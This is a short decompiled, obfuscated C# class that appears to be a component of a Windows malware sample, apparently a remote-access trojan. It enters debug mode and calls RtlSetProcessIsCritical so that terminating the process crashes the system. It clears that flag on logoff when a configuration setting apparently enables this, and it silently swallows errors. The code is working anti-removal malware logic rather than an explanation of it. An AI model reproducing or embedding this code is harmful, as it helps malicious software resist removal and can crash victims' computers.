using System;
using System.Diagnostics;
using System.Threading;
using Microsoft.Win32;
using ns1;

namespace ns19;

public static class GClass25
{
	public static void smethod_0(object sender, SessionEndingEventArgs e)
	{
		if (Convert.ToBoolean(GClass10.string_14) && GClass22.smethod_0())
		{
			smethod_2();
		}
	}

	public static void smethod_1()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		try
		{
			SystemEvents.add_SessionEnding(new SessionEndingEventHandler(smethod_0));
			Process.EnterDebugMode();
			GClass24.RtlSetProcessIsCritical(1u, 0u, 0u);
		}
		catch
		{
		}
	}

	public static void smethod_2()
	{
		try
		{
			GClass24.RtlSetProcessIsCritical(0u, 0u, 0u);
		}
		catch
		{
			while (true)
			{
				Thread.Sleep(100000);
			}
		}
	}
}
